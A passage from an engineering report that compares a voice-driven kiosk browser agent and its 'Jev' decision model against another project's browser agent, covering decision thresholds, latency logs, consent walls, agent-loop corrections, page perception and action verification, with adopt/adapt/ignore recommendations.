| Next-line offers, `/help` | det, largely by site | Failure carries a next line, often `help` | Better in form, weak in this slot | Adapt the idea by kind, M | C23 |
| Page indicator, target ring, Stop | det | 3 px outline, 400 ms; Stop by voice | Different; from 2 m neither checked | Ignore; lease and longer mark are hypotheses | — |

| long tail | call | why |
|---|---|---|
| Run journal, reconnect | ignore | a service worker dies; ours doesn't |
| Replay-gap note | ignore | `lastResult` keeps the outcome |
| Reading-first scroll | ignore | nobody wheels a kiosk's Feed |
| Slash commands | ignore | typed; `outOfBand` maps to `goes_on` |
| Keyboard shortcuts | ignore | |
| Localisation | ignore | one owner |
| Streaming | ignore | Jev generates nothing |
| Error dedupe and formatting | ignore | one Answer per Command |
| Steering toast | we're ahead | a Fate that is said |
| `/progress`, `/btw` | we're ahead | `say_doing` answers aloud |
| Completion chime, confetti | ignore | principle 4 |
| "Stopping…" | ignore | our Stop ends at once |

### Providers (`findings/providers.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Every host fails (rule 3) | det fallback, both | Local Match, then the Planner | Meets the letter, misses the reason: fires on 1 of 86 Instant lines | Adapt, S-M (candidates has M) | C12 |
| Fallback Hosts against provider retry | det | Chain with per-attempt records | Ahead on design; the kiosk has not been using it | Set the env, S, no code | C11 |
| Deadline by what the caller promises | det | 3,000 ms on the kiosk, 2,250 ms with a host after | Worse on this point | Adapt: 750 ms fallback timeout, env, S | C11 |
| Aborting an ask no longer needed | det | Port supports it; `askJev` never passes one | Worse | Adopt the idea, S | C13 |
| Rate-limit classes and the Planner | det | None; a 429 ends the Errand | Worse for an Errand, irrelevant to a Command | Ignore for now | — |
| On-device and local hosts | hybrid | A host by env (`ours:src/main/decision/createDecisionModel.ts:L110-L123`) | Different | Ignore on-device, L | — |
| Cost allowance | det | None; tokens recorded | Different | Ignore: cents a week | — |

| long tail | call | why |
|---|---|---|
| Temperature | hypothesis | Jev takes none; Planner sends none; Brief writer 0.3 |
| Streaming parsers | ignore | a Planner reply is about 47 tokens |
| Text tool-call parsers | we're ahead | no tools on the wire |
| Context window detection | we're ahead for a fixed host list | Jev's refusal wording unverified |
| `BaseLLMProvider` normalisation | ignore | public-market breadth |
| Compass proxy | ignore | public-market |
| Answer contract checks | ignore | our logs name the model |
| No re-send on non-idempotent POST | different, fine | the chain re-sends on purpose |
| Private-network proxy | ignore | extension-only |

### Walls and media (`findings/walls-media.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| A done that says nothing | LLM closed read | Passage Choice on the Verdict's call (`ours:src/core/command/jevReading.ts:L1525-L1534`) | Different: their check polices a writer; the class fact applies | Adapt, S; T4: 7 silent dones, none owed words, no positive case yet | C5 |
| `page_blocker` | hybrid | Cover by behaviour; Verdict names one `in_the_way` | Same shape; theirs sharper on the want, ours on the layer | Adapt, M | C26 |
| A consent wall named by a regex | det | Position, controls, Jev's `consentQuestion` | Worse on recognition, better on choice | Adapt, S-M (candidates has M) | C25 |
| The same wall read twice | det memo | No memo | Worse: 4 of 5 consent asks in 10 days repeat | Adapt, S | C27 |
| The page's declared media, for a capture | det | Capture Ops by kind (`ours:src/core/command/captureOp.ts:L4-L12`); `og:image` for News alone | Worse for one case: `goal-13` | Adapt, S | C9 |
| A video's words | LLM | None | Different; 0 of 499 spoken lines ask | Ignore for now, keep the idea | — |
| Autoconsent library | det | Watch by kind, no wait | Ahead on latency and policy: 775 of 1,198 rules are URL-patterned | Ignore as a library | — |
| Media control, wall-interrupted media | det; hybrid | See Actions, Media Ops | Ahead: they have no media tool | We're ahead | — |

| long tail | call | why |
|---|---|---|
| CAPTCHA solving | ignore | 0 of 574 asks hold challenge wording |
| Challenge as a response fact | adapt if a line appears, S | a fact beats the title regex |
| Challenge frames kept clear | ignore | a host list |
| Reading stops at the wall | different | stops a writer inventing; bears on #415 |
| Hide-only rules | ignore | leaves an unanswered CMP |
| Consent-wall note | level | `consentDismissalLine` |
| `delegate_research` | ignore | far past the Task promise |
| `research_url` | ignore unless the hypothesis holds | |
| `download_public_media`, MSE recorder, HLS decrypt | ignore | site lists; no spoken line |
| Recording and transcription | ignore | our ear is live and local |
| Page feedback monitor | ignore as built | see Proposed `wall-handoff` |
| Generated video duration and joining | ignore | |

### Firefox against Chrome (`findings/firefox-diff.md`)

A browser-to-browser capability diff. Its scope makes no adopt or adapt recommendations, and its bearing on us is none on a normal day, since we are on the Chrome side of every row (`ours:AGENTS.md:L131-L134`). Section 3 uses it to correct the README.

| capability | Chrome | Firefox | C |
|---|---|---|---|
| Manifest, background | MV3 service worker | MV2 persistent page | — |
| `debugger` | yes | absent | — |
| Click, hover, keys | trusted through CDP | untrusted in standard mode; trusted with the opt-in companion | — |
| Native dialogs | `startDialogHandling` | none found in standard mode | — |
| Shadow DOM | open and closed | open roots walked; no closed-root traversal, no `shadow_dom_query` | — |
| WebMCP, WebGPU models, nine Dev tools | present | absent | — |
| Spoken input | Web Speech | same code, its comment says stock Firefox has no recogniser | — |
| Tab and screen recording | `tabCapture` | refused | — |
| Retry after a recent navigation; sent, not sent or unknown dispatch | seen in passing; not assessed against ours | | C7 (passing note) |

## 5. Per-subsystem detail

The best of each findings file, condensed. Full evidence is in `findings/<name>.md`. Every call below is a reading of code and logs unless it names a test (T1 to T9, `findings/measurements.md`). Licence on every row: idea only (section 7). Where `measurements.md` changes a finding, this section follows it and says so. H-numbers are the hypothesis list in that subsystem's finding.

### Decisions: how they ask, how we ask

**Read this before any "Jev" number.** The kiosk ran two models under the name. Baseten's Mammoth answered 269 asks to 2026-10-28, and 146 decision records carry a `jev-1.14.0` read after that. `kiosk-perf-report.txt`'s headline p50 584 ms mixes them; do not quote it. T8 reconciles the counts: those 146 records, 37 more answers riding as Appliance reads gives 183, and 189 ask lines in the asks log (6 not traced). 0 failures on any count.

| | their fast path | their semantic questions | ours |
|---|---|---|---|
| model | `jev-1.13.0` only when the provider is `typesafe`: `repo:src/chrome/src/agent/systemone-judge.js:L11-L12` | default `cloudflare/clef-flash`, not Jev: `repo:src/chrome/src/agent/decision-config.js:L3-L3` | `jev-1.14.0` pinned: `ours:src/core/decision/decisionRouting.ts:L20-L29` |
| on by default | off in Auto; in explicit On a missing switch reads as on: `repo:src/chrome/src/agent/decision-config.js:L86-L89` | follows the model in use: `repo:src/chrome/src/agent/decision-config.js:L8-L10` | always, on every line the grammar leaves: `ours:src/main/run/commandRunner.ts:L1515-L1540` |
| on a miss | the chat LLM, same step: `repo:src/chrome/src/agent/agent.js:L9923-L10002` | the LLM with a quote, else nothing: `repo:src/chrome/src/agent/agent.js:L9681-L9698` | no LLM on the Command path; `best_guess`: `ours:src/main/run/commandRunner.ts:L1614-L1628` |
| card | separate heads in one call, options opaque (`ref_12`): `repo:src/chrome/src/agent/systemone-fast.js:L55-L106` | one small closed question per text: `repo:src/chrome/src/agent/semantic-decisions.js:L20-L541` | one flat `action` Choice, each option the whole act and ref: `ours:src/core/command/jevReading.ts:L1404-L1414` |
| state | task, controls, no page text, no history: `repo:src/chrome/src/agent/systemone-fast.js:L99-L103` | bounded data, 600 chars a string: `repo:src/chrome/src/agent/semantic-decisions.js:L568-L578` | line, Step, Done so far, Text in view, media, every ref: `ours:src/core/command/jevReading.ts:L1048-L1078` |
| cap | first 24 controls in walk order, unranked, unsaid: `repo:src/chrome/src/content/accessibility-tree.js:L975-L980` | 12,000 bytes, 16 items: `repo:src/chrome/src/agent/agent.js:L9654-L9655` | Card Budget 16,384 tokens, cuts named: `ours:src/core/decision/cardBudget.ts:L1-L18` |
| bar | probability and confidence both ≥ 0.90: `repo:src/chrome/src/agent/systemone-fast.js:L48-L52` | ≥ 0.85 to let through, 0.7 to hold: `repo:src/chrome/src/agent/agent.js:L9671-L9671` | action at hop 0 none (ADR 0076): `ours:src/main/run/commandRunner.ts:L1633-L1653`; Verdict 0.7, probability only: `ours:src/core/ports/decisionModel.ts:L142-L154` |
| timeout | 1 s: `repo:src/chrome/src/agent/agent.js:L9964-L9964` | 2.5 s, 4 s batch, then LLM: `repo:src/chrome/src/agent/agent.js:L9653-L9653` | 800 ms default, 2,250 ms with a host after it: `ours:src/core/decision/decisionRouting.ts:L69-L69` |
| suspended | two fallbacks on a snapshot, two unchanged observations, a contract failure: `repo:src/chrome/src/agent/systemone-fast.js:L168-L193` | 30 s on an unanswered blocker: `repo:src/chrome/src/agent/agent.js:L338-L338` | never; nothing stands behind it |

Their doc says frames and shadow roots "fall back as a whole". In code those controls silently drop off the card: `repo:src/chrome/src/content/accessibility-tree.js:L945-L946`.

**Measured from our logs, 2026-10-25 to 2026-10-31.**

| measure | `jev-1.14.0` | Mammoth |
|---|---|---|
| latency p50 / p95 / max | 264 / 520 / 599 ms | 1,192 / 2,142 / 2,943 ms |
| refused or timed out | 0 | 12 of 429, 5 timeouts |
| action top ≥ 0.7 / 0.85 / 0.9 | 75 / 68 / 60 % | 71 / 54 / 46 % |
| Verdict `yes` under 0.7 | 3 of 16 | 22 of 33 |

- Jev's latency barely moves with the card: 159 ms under 1.5k tokens, 273 ms at 6k+. So `reliability.md`'s "1,320 / 2,430 ms" budget row is Mammoth's, and the smallest card now buys about 100 ms. It can still buy fewer lures.
- **The claim, tested from evidence.** Per decision, the advantage is real: 264 ms against `planner-step` p50 2,749 ms. Cost is irrelevant: about $0.02 a day at WebBrain's $0.042 per million (`repo:src/chrome/src/agent/systemone-judge.js:L185-L185`, not checked against TypeSafe). On the Felt Reaction, no: the ask is 267 ms of a 1,869 ms page Reaction (spoken, hop 0, n=20), and the collect is 1,107 ms.
- **Would their bars fit?** Spoken hop-0 lines, n=164, "re-said" as a stand-in for a Frustration, part of it STT: under 0.85 17 % re-said, from 0.85 up 6 %. 0.85 would divert 35 % of lines to catch at most 10 re-says, and there is nowhere to divert to. That supports ADR 0076 on this evidence. Unsure readings cluster on page verbs (21 of 33 under 0.7), against `play` (8 of 66) and media ops (6 of 46).
- **The confidence gap.** `ours:src/core/ports/decisionModel.ts:L145-L150` says `confidence` sits about 0.1 under probability. True of `outcome`, `where`, `extent`; false of `action` (p50 gap about 0.001). So their "both must clear" means nothing on a many-option head. Probability alone is the cleaner rule.
- **Is their speedup measured? No, by their own statement:** "not a verified speedup until the paired live evaluation passes", `repo:test/jev/README.md:L3-L5` (doc), `performanceVerified:false` in `repo:test/jev/benchmark.mjs:L9-L9`, no result in the tree. The protocol is good; the bars have no data behind them.

**Worth taking, all as gate arms.**

| idea | theirs | ours today | call | scenario | effort |
|---|---|---|---|---|---|
| `control_effect`: closed Choice on a caption, cautious answers pass at 0.7, permissive at 0.85 | `repo:src/chrome/src/agent/semantic-decisions.js:L231-L255`, `repo:src/chrome/src/agent/agent.js:L9671-L9671` | eleven English words or the Planner's `leaves`: `ours:src/core/errand/confirmClass.ts:L15-L18`. Misses `Tweet`, `Share`, `Confirm`, `Book`, `Checkout`, `Transfer` and any icon | adapt as an OR on the confirm; the rule stays the floor. Errand only: about 265 ms per uncached click | goal (4) | M |
| wall kind as a head beside `outcome` | `page_blocker`, per text: `repo:src/chrome/src/agent/semantic-decisions.js:L481-L500` | single `in_the_way`, kind by regex: `ours:src/core/browser/blockerNudge.ts:L95-L124`. Owner hears "A pop-up is in the way" over a sign-in wall | adapt, read for what is said, no added call. Logs thin: 5 `wall` Tasks | wall (6), touches #415 | S-M |
| `menu-N` off the first ask | no right-click at all: `repo:src/chrome/src/agent/systemone-fast.js:L66-L80` | on every clickable ref: `ours:src/core/command/jevReading.ts:L1414-L1414`. 22 % of options, 0 top picks of 323; `capture-N` 5.6 %, 0 picks | adapt, gated; our own comment records the lure: `ours:src/core/command/jevReading.ts:L1395-L1395` | open, read, search (10), setting, wall (6) | S |
| operation and target as separate heads | `repo:src/chrome/src/agent/systemone-fast.js:L70-L92` | flat product, median 154 options, 3 of 344 asks hit 255 | gate arm only; a tie stays ours. Heads can disagree with nothing joining them | open, read, search (10) | M |
| higher bar on a Verdict `yes` | their `done` only nominates: `repo:src/chrome/src/agent/systemone-fast.js:L78-L78` | 0.7, and nothing checks afterwards: `ours:src/main/run/commandRunner.ts:L2578-L2578` | hypothesis 4, `atLeast` cases, no new card | open, question (10), setting (6) | S |

**Ignore, or we're ahead.** The 24-control cap: 74 % of our page cards exceed it, and `Me at the zoo` was right at position 43 of 57; Jev has no latency reason for it. `run_mode`, `plan_need`: ADR 0095's arm A, measured and lost (ADR's numbers, not rerun). `user_turn_kind`: the Fate does it on the same card. LLM quote check: our Slot options are spans of the line, exact by construction: `ours:src/core/command/jevReading.ts:L204-L222`. Per-text memo: 8 of 574 whole-card asks repeated. Strict answer contract: 0 malformed in 432 asks. Page data marked untrusted (`repo:src/chrome/src/agent/systemone-evidence.js:L31-L42`): we have none on the card and ADR 0068 accepted that; see Safety for why nothing here shows a wrapper helps.

**Where we are ahead here.** Jev does the whole step with no chat model behind it. The state carries Text in view and Done so far, so a `done` is grounded. About 480 corpus cases and a replay, where their trace deliberately omits evidence and raw responses (`repo/test/jev/README.md` L45-L48, doc). One caveat of ours: 78 of 88 Where Asks read `none` again, mostly ambient, but `Go to Idle Screen.` read `none` twice on page cards.

### Agent loop: steering, limits, loops

**The one real finding is ours, not theirs: fragments (C1).** 20 kiosk Fates, 10-28 to 10-30, how it breaks and not a per-day count. By reading, with no ground truth, 5 look wrong, all one class: a short fragment finishing or re-saying the line before, read as something other than `joins`.

| line | line before | read | what followed |
|---|---|---|---|
| `Nicki Minaj.` (turn-mvtmtyol-vh, Jev, 2.1 s after) | `Play New Body by Drake.` | `goes_on` | its own play, reaction 11.5 s, then the whole line said again |
| `Bum, Kanye West.` (turn-mvsifc3b-v10, Mammoth, 1.8 s) | `Play highs and lows.` | `goes_on`, code made it `ends` | started a chain of 5 lines |
| `P-O-M-M-E, Kanye West.` (turn-mvsifm0v-v12, Mammoth, 2.7 s) | `Play highs and lows.` | `goes_on` | played a search for those words, then said again |
| `To the top.` (turn-mvtpj6r7-v1l, Jev) | `Scroll to the top.` | `goes_on` | two Tasks on one page, below |
| `L-O-O-P.` (turn-mvsihjew-v18, Mammoth, 1.5 s) | `Look this up.` | `waits` | on the ledger, stage `reading`, claimed by #500 |

**T1 measured the first line:** `goes_on` 3 of 3 on `jev-1.14.0`, confidence 0.19-0.25, `joins` 0.27-0.31, and the kiosk's own read agrees. The fork is near-even between three labels, none near the 0.7 bar, and unsure goes on (`ours:src/core/command/applianceCard.ts:L317-L319`). One line, no ground truth. Spelled lines also carry an ear problem, so STT may own part of the class.

| feature | theirs | ours | call |
|---|---|---|---|
| Correction while running | The person picks by key, Steer or Queue, and the default queues: `repo:src/chrome/src/ui/sidepanel.js:L2606-L2608`. No model reads the relation during a run. Delivered at the next boundary, batch remainder skipped: `repo:src/chrome/src/agent/agent.js:L58580-L58592` | Fate on the same ask: `ours:src/core/command/runningCommand.ts:L91-L112` | **We're ahead.** A voice line has no second key |
| Join keeps the record | Three things kept apart: what was asked `{request, updates}` (`repo:src/chrome/src/agent/agent.js:L27515-L27534`), what was done (receipts, `repo:src/chrome/src/agent/agent.js:L6797-L6855`), what proves done (reset, `repo:src/chrome/src/agent/agent.js:L6782-L6795`) | Words kept, record lost: new Task with `visited: [], actions: [], setAside: []`, `ours:src/main/run/commandRunner.ts:L3383-L3383`; `stands` compares hop 0 only: `owner.fired` is written at hop 0, `ours:src/main/run/commandRunner.ts:L2091-L2096`, and compared at `ours:src/main/run/commandRunner.ts:L4056-L4056` | **Adapt, S-M.** See below |
| One writer on the pane | A second run on a tab throws: `repo:src/chrome/src/agent/agent.js:L6389-L6395` | `goes_on` fires beside the running line; only navigate, search, back, forward, reload, resume, pane `play` take the pane: `ours:src/main/run/commandRunner.ts:L1219-L1221` | **Adapt, measured, M.** Three arms, H2 |
| Errand under a correction | Stays in the run, same receipts, plan re-gated | `endRunning` ends the Errand even on `joins`: `ours:src/main/run/commandRunner.ts:L1072-L1073` | Adapt after the join, M. Neither superseded Errand in the logs was a correction, so unevidenced |
| Step limit | 130, then a forced last turn and a Continue button: `repo:src/chrome/src/agent/agent.js:L59165-L59203` | 5 actions: `ours:src/main/run/commandRunner.ts:L2627-L2632`; Errand 90 s: `ours:src/main/run/errand.ts:L151-L151`. Hand-off needs no button: `ours:src/main/run/commandRunner.ts:L4079-L4079` | **We're ahead.** 0 of 7 Errands hit `cap` |
| Plan before act | Gate with a review card up to 2 minutes: `repo:src/chrome/src/agent/agent.js:L27638-L27642` | No plan; arms within noise in ADR 0095 (19/60, 21/60, 22/60) | Ignore. Decided by measure |
| Loop detection | 988-line detector, nudges then stops at 8: `repo:src/chrome/src/agent/loop-detector.js:L958-L986` | Noul plus set-aside: `ours:src/main/run/commandRunner.ts:L3027-L3033`; two strikes: `ours:src/main/run/commandRunner.ts:L3062-L3062` | **Ahead on Tasks.** On Errands a chat model can repeat itself and only the clock stops it: adapt, a memory line, S, H6 |
| Auto-mode routing | Read-only until a sure `act`, 250 ms wait: `repo:src/chrome/src/agent/auto-mode.js:L90-L99` | No permission mode; Errand's confirm is the exception | Ignore. Unsure-does-nothing goes against reliability rule 5 |

**The join, worked out (by reading, not reproduced).** A correction after a multi-hop page Task reads from a card that does not say what the first line did. The Verdict and Noul have no Done so far, set-asides are forgotten so an option Jev ruled out returns, the 5-action cap restarts so one line can reach ten, and a hop-1 action re-read can fire again where #510's fix covers hop 0 only. **Every `correct` Sequence Case is a `play`**, so 17/26 cannot see this. Change: carry `actions`, `visited`, `setAside` and the cap count into the joined Task, put Done so far on the join's ask, compare `stands` to the last action fired. Do not carry `stalled` or `last`: their reset-of-proof point applies to us too. No stage added. Scenario: overlap (20). It adds a case and closes a road; it does not touch today's 9 reds. Whether Jev would say a sure yes on the first line's landing is untested.

**Two writers on one page, kiosk, 2026-10-29, n = 1 of 20 Fates.** `Scroll to the top.` (`turn-mvtpj2gh-v1k`), then `To the top.` (`turn-mvtpj6r7-v1l`) 5.8 s later, read `goes_on`. The first scrolled down, clicked ref 1, the second clicked ref 1, then both scrolled up and both ended done. Each Task's Noul judged a page the other was moving. The arms: one page-writing dispatch at a time (adds at most one `browser-input`, p95 164 ms, n = 9, on a page write only while another runs), a page write `ends` the running page Task (cheapest, risks `12-scroll-while-sheet-closes`), or each Task's Done so far names the other's action.

**Do their ideas help today's overlap reds? Mostly no.** #490 is the ear. #502 is an artist not in view. #508 and #510 have code at the pin, not rerun. `2-correct-the-other-one` and `3-add-on-loop` are noise per the list. `1-replace-new-goal`'s remaining cause was not in what was read, since `endRunning` already pauses an ended `play` (`ours:src/main/run/commandRunner.ts:L1092-L1095`).

**`waits` in practice.** `Loop the song, I said.` 43.0 s and `Loop this song. L-O-O-P.` 26.2 s, Instant by Tier, before #516; `Loop.` 1.3 s on 10-30 (turn-mvv6tx8w-vj). The wait was the song's lookup, not the Fate. n = 3.

**Ignore.** Steering journal (MV3 restarts), scratchpad (ours is built by code), progress ledger (bulk typed work, not our Progress Noul despite the word). `continue` is an alias of `resume` (`ours:src/core/command/localMatch.ts:L89-L89`), so a spoken "keep going" after an Errand's cap has no road; no log shows it wanted, so it is not proposed.

### Perception: what the card shows

Our structure is ahead on nearly everything: one flat page across frames and open shadow roots, one gate-measured budget, facts on the ref line. **The gaps are all in what survives onto the card on a long page.** Vocabulary: "the card" is the Action Card; in `CONTEXT.md` the Turn Card is the Idle Screen's report.

**What the card leaves out** (`ours:src/core/command/jevReading.ts:L1048-L1073`): text past character 300 of a block; blocks past the budget, unsaid; in-view refs past 75, unsaid; what holds a ref; whether a ref is covered; the page's own scroll position; open-shadow-only text and text of frames off the view.

| feature | theirs | ours | call | scenario, effort |
|---|---|---|---|---|
| What survives the cut (C8) | The model fetches: windows by offset, `find_text`, each a generative round trip: `repo:src/chrome/src/agent/read-page-window.js:L140-L178` | Show Op on every block, one ask (`ours:src/core/command/jevReading.ts:L929-L941`). Nearest the view stays; the line's words have no say: `ours:src/core/command/jevReading.ts:L949-L951`, `ours:src/core/command/jevReading.ts:L1371-L1385` | Adapt: room first to blocks sharing a content word with the line, then headings, then nearest. **Untested: T7 could not run** | read, question (10), S |
| Tail of a long paragraph | No per-block cap in a 4,000-char window: `repo:src/chrome/src/agent/read-page-window.js:L1-L3` | 300 chars each: `ours:src/core/browser/pageText.ts:L190-L193`; passage Choice offers the same text: `ours:src/core/command/jevReading.ts:L1525-L1534` | Adapt: split at sentence ends, entries sharing a node, or a longer cap; a real tie for the gate. Competes with the row above, build together | question, read (10), M |
| Open surfaces first | Menus, listboxes, dialogs before the page: `repo:src/chrome/src/content/accessibility-tree.js:L1387-L1486` | Dialogs only: `ours:src/main/browser/collectPageScript.ts:L61-L61`; a flat 75 outside the budget: `ours:src/core/browser/snapshot.ts:L712-L715`, unsaid on the card though the Planner's read says it: `ours:src/core/browser/snapshot.ts:L835-L837` | Adapt, three changes: refs compete under the budget, open menus rank with dialogs, say the cut | open (10), setting (6), S each |
| Repeated labels | Indented depth, and a popup names its record: `repo:src/chrome/src/content/accessibility-tree.js:L1379-L1381` | Label and address only, order the sole clue: `ours:src/core/command/jevReading.ts:L273-L295` | Adapt only where a label repeats (`More actions on "<title>"`). A guess until the corpus reaches it | open (10), goal (4), M |
| Covered controls | `occluded=true` by hit tests on every line: `repo:src/chrome/src/content/accessibility-tree.js:L775-L825` | At act time, deliberately (ADR 0062): `ours:src/main/browser/collectPageScript.ts:L1397-L1413` | Hypothesis, never in place of the act-time check | wall (6), S-M |
| Frames | Separate tools, a model-picked selector: `repo:src/chrome/src/agent/agent.js:L51315-L51340` | Merged flat at the iframe's place: `ours:src/core/browser/frames.ts:L79-L167` | **We're ahead by a wide margin** | wall (6) |
| Shadow DOM | Two hosts by name, else tools: `repo:src/chrome/src/content/accessibility-tree.js:L229-L234` | Refs pierce every open root: `ours:src/main/browser/collectPageScript.ts:L598-L611`. **Text walk does not**: `ours:src/main/browser/collectPageScript.ts:L948-L977` | Refs ahead. Text: adapt, collector test first; size of the gap unknown, no kiosk line shows it | read, question (10), S |
| Budgets | Windows by provider, 6,000 to 16,000 chars: `repo:src/chrome/src/agent/read-completeness.js:L58-L68` | One number for every model: `ours:src/core/decision/cardBudget.ts:L18-L26` | **We're ahead.** The card Jev gets is the card the gate measured | read, question |
| PDFs | Complete: detection, `pdf.js` offscreen, OCR: `repo:src/chrome/src/agent/pdf-extraction.js:L178-L207` | None: only tests and download names. What a PDF link does in our pane is not settled | Ignore for now; reproduce one link first | proposed `pdf` |
| Vision | Default on act runs, per-provider sizing, pixel diff: `repo:src/chrome/src/agent/vision-mode.js:L35-L84` | Stripped by ruling; Mark Ask remains, same 1,568 px: `ours:src/main/browser/drawMarks.ts:L1-L20` | Ignore. L against yield 4. A canvas with no ref stays out of reach (goal cases 13, 14) | goal (4) |
| Semantic page retry | Nudge at 2, stop at 4: `repo:src/chrome/src/agent/loop-detector.js:L474-L511` | Five actions, Noul: `ours:src/main/run/commandRunner.ts:L3027-L3035`; our signature holds no ref number: `ours:src/core/browser/snapshot.ts:L901-L914` | Ignore. A model mistaking fresh refs for progress is not our failure | none |

**Kiosk evidence (how it breaks, not how often).**
- **The cut:** 11 asks cut, all Wikipedia, each losing 70 to 99 further-down options (`turn-mvtn3g95-2`, `turn-mvtouzek-3`). `show me the part about his death` (cli-32-mvm65npd) takes 3 calls, `Toggle the table of contents` at 0.51 first. That fits the block being off the card; not confirmed for that card, and its line is not in the kiosk logs. T7 found two reasons no case could run: `Do it.` has no content word and the cut blocks are not logged, only `cuts: [{"kind":"further","count":74}]`. Settling it takes a built arm over a long page, with a section-asking line, through `jev:gate`.
- **The tail:** 411 of 5,882 quoted blocks sit at the cap; on Wikipedia 249 of 589 further-down entries (42 %).
- **The 75:** 4 of 256 page cards, all the Great Wall (`turn-mvtn5d45-vt`), list stopping at `[75] link "[7]"` mid-lead. Refs per card p50 39, p90 55. Not traced whether a line was lost.
- **Repeated labels:** 1,464 of 8,853 labelled refs (16.5 %) share a label on the same card: `More actions` 459, `Settings` 258, `Niyam` 122.
- **Frames:** 205 of 469 collects left a frame unread (137 of 214 attributable to YouTube), and no card of 574 asks carries an `iframe` ref, so no visible cost in these 10 days. Grace is 50 ms: `ours:src/main/browser/createCdpBrowserController.ts:L157-L157`.
- **Spend:** on `turn-mvtn3g95-2`, state 19,721 chars, action Choice 21,845. A `show-N` line repeats 80 chars of its entry (`ours:src/core/command/command.ts:L417-L420`), so a further-down block costs up to about 400 chars and the budget binds near 60 blocks. A 30-char quote would free about 10 more blocks, and may cost picks. Hypothesis.

**Collect cost, Felt Reaction.** `browser-collect` p50 287 ms, p95 4.9 s, 115 of 469 over 1 s. Every collect reads up to 240,000 chars (`ours:src/core/browser/pageText.ts:L104-L104`), which an Instant line may not need. The span does not split text from refs, so a sub-span comes first. This is where the wait is, not the ask.

**Proposed:** `read-out` (have the part in view said aloud; `missing`) and `pdf` (`undated`). Since ADR 0099 no spoken line reaches a read: `ours:docs/adr/0099-the-app-speaks-only-the-page-read-is-removed.md:L17-L22`. The owner ruled, so `read-out` is listed for a count and the perception agent's recommended answer is closed for now. On a build that had the road, 13 spoken read lines played 16 s to 631 s (`turn-mvtoyavx-v13`: 630,886 ms); the Great Wall read at `turn-mvtn3rfb-vm` was followed by `Stop.`.

### Actions: how we know an action worked

In one line: **they verify because the model may lie; we verify because the page may not have changed.** Their strongest idea is the split between proof, weak evidence and veto. Ours is that the facts go to Jev rather than to a rule.

| action | ours | theirs |
|---|---|---|
| click | Target state, URL, dialog, signature, arrival; next hop re-reads; Noul and Verdict on the same call | URL or new focus is proof; text, media, controls are weak; tab, network, download are vetoes: `repo:src/chrome/src/agent/agent.js:L55631-L55690`. Then a debt and a separate judge |
| type | Value printed after the submit, never compared: `ours:src/main/browser/createCdpBrowserController.ts:L2487-L2531` | Named-reader readback; Enter sent only after exact: `repo:src/chrome/src/agent/agent.js:L39442-L39447` |
| key | No outcome: `ours:src/main/browser/createCdpBrowserController.ts:L2539-L2558` | A consequential key opens the debt: `repo:src/chrome/src/agent/completion-invariant.js:L763-L785` |
| media | Facts before and after in one tick: `ours:src/main/browser/pageMediaScript.ts:L228-L261` | No such op |
| whole Task | Verdict at 0.7 on the same ask, or a Local Match ends on the outcome | `done` blocked until observed, then a judge at 0.9: `repo:src/chrome/src/agent/completion-verifier.js:L84-L131` |

**A refused action that reached nothing ends the Task (C7). Corrected by T6 and by re-opening the code.**
- **Theirs:** the page moved under a chosen action, nothing dispatched, the action is re-chosen on a fresh look. Nudge at 2, stop at 5: `repo:src/chrome/src/agent/page-feedback-recovery.js:L49-L69`.
- **Ours:** ADR 0033's refusal carries the fresh page, and the runner throws it away: `ours:src/main/run/commandRunner.ts:L2300-L2319` returns `wall`, which ends the Task: `ours:src/main/run/commandRunner.ts:L2627-L2632`.
- **The going-on half is unsupported.** The `actions` finding expected 2 of 5 `wall` ends to go on. T6 shows the re-read's card equals the refused card, and Jev picks `click-1` (`Continue with phone`) again at 0.92, 0.94; going on opens a phone sign-up. Hop 0's click on `X` was already the misread. `turn-mvsfg0oe-ve` was not tested.
- **The plain-line half stands, on one logged line.** "That number isn't one I can use here" (`ours:src/core/command/spokenFailure.ts:L70-L71`) fires only on `/^ref \d+ refused\b/` (`ours:src/core/command/spokenFailure.ts:L92-L94`). `turn-mvsfglol-3` (hop 1 of `turn-mvsfgjo9-vh`, spoken `Click on the first link.`) hits it; the owner said no number. `turn-mvsfg84d-2` errors with `the text block is no longer on the page` and does not. TTS text is not logged, so what was said is by reading. Failure path only.

**"What appeared" credits the action with the page's own loading.** Any signature difference makes a click meaningful (`ours:src/main/browser/createCdpBrowserController.ts:L1250-L1264`), and every fresh ref is told as appeared under it (`ours:src/core/command/jevReading.ts:L618-L625`). Real Done so far: `click "Dislike this video" (… "https://ridge.com/MKBHD", "...more" … appeared)` (`turn-mvqi2qbw-5`). "(nothing changed)" appears in 0 of 574 asks, so the inert rail (#336) has not fired on a hop ask in ten days. The Noul often saves it (0.02 on the like), not always: `No.` clicking `Leave history off` ended done at 0.80 (`turn-mvpdsl2m-vw`). **Adapt, M, a tie for the gate:** "appeared by the control" against "elsewhere" (their region scoping: `repo:src/chrome/src/agent/completion-result.js:L50-L69`). Do not import the network veto or their attribution window; those govern an automatic second click we do not make. Scenarios: setting (6), control (20) when a line misreads into a page click.

**A never-settling action locks the whole browser (C10).** Theirs: a deadline, then `outcomeUnknown`, `retryable: false`, tab still usable: `repo:src/chrome/src/cdp/cdp-client.js:L5346-L5362`. Ours: custody refuses every later call until the operation ends (`ours:src/core/browser/unsettledAction.ts:L216-L223`); `stop` passes (`ours:src/core/browser/unsettledAction.ts:L166-L166`), and `abandon()` has no production caller. 2026-10-25: typed `go back` (`turn-mvocktqm-a`), then 1,745 refusals, 1,741 from `music.player.evaluate`, 4 from `collectPage`. T8 ties the 4 refusals to the 4 lines read `none`, all typed. **Fixed at the pin for the in-page case** (`ours:src/main/browser/paneNavigation.ts:L279-L292`, `ours:src/main/music/player.ts:L641-L647`). What ended the hold is unsettled: T8 infers a relaunch from file boundaries, unproven. **By reading only:** a back that ends with no commit (204, download, aborted load) has no stopped arm, where `commitOrStop` does (`ours:src/main/browser/paneNavigation.ts:L245-L256`). Adapt, S arm, M for the bound; ADR 0038 must change with it. No yield claim. No stage.

**Readback before a bundled submit.** One evaluate before the Enter; if the field's exact value does not hold the words, send no Enter and say so in the outcome. `input` and `textarea` only: they learned a contenteditable's doubt is not refutation (`repo:src/chrome/src/agent/browser-batch.js:L67-L70`), and even lean mode keeps this guard (`repo:src/chrome/src/agent/lean-mode.js:L131-L145`). S. Insurance, not a measured gain: no failure since #398, 3 `type` and 8 `search` decisions logged. Quick Tier, one evaluate, no span covers it yet. Protects search (10) from a wrong query; does not touch the mishear that is its distance.

**We're ahead.**
